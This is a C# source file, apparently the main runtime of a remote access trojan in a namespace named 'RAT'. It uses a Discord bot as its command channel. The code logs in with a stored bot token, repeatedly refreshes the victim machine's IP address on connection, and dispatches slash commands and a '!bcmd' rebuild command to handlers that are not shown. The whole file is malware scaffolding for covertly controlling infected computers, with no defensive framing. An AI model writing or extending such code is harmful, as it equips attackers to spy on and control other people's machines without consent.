using Discord;
using Discord.Rest;
using Discord.WebSocket;

namespace RAT;

public class MainRuntime
{
    public static DiscordSocketClient client = new();
    static readonly string tken = File.ReadAllText($"{Environment.CurrentDirectory}/token.tken");
    public static async Task Main()
    {
        await client.LoginAsync(TokenType.Bot, tken, true);

        client.Log += async log => await Task.Run(() => Console.WriteLine(log));
        client.SlashCommandExecuted += Handlers.SlashComamndReceived;
        client.Connected += async () =>
        {
            // Refresh the IP when connected to the Gateway
            while (!await VictimInformation.Shared.RefreshIP())
            {
                await Task.Delay(1000);
            }
        };
        client.MessageReceived += async msgSket =>
        {
            // Not from user, return;
            if (msgSket.Author.IsBot) return;

            if (msgSket.Content.Split(' ')[0].Contains("!bcmd"))
            {
                ISocketMessageChannel cnn = msgSket.Channel;
                using (cnn.EnterTypingState())
                {
                    ulong msgId = (await cnn.SendMessageAsync(embed: new EmbedBuilder { Title = "Rebuilding Commands...", Description = $"The current slash commands are being rebuilt, please hold...", Footer = Utils.GetTimeFooter() }.Build())).Id;

                    await CommandBuilder.Shared.BuildFor(msgSket.Channel.GetGuild());
                    await cnn.ModifyMessageAsync(msgId, ogrsp =>
                    {
                        ogrsp.Embed = new EmbedBuilder
                        {
                            Title = "Commands Rebuilt.",
                            Description = "The available commands were rebuilt for this guild.",
                            Footer = Utils.GetTimeFooter()
                        }.Build();
                    });
                }
            }
        };
        await client.StartAsync();
        await Task.Delay(-1);
    }
}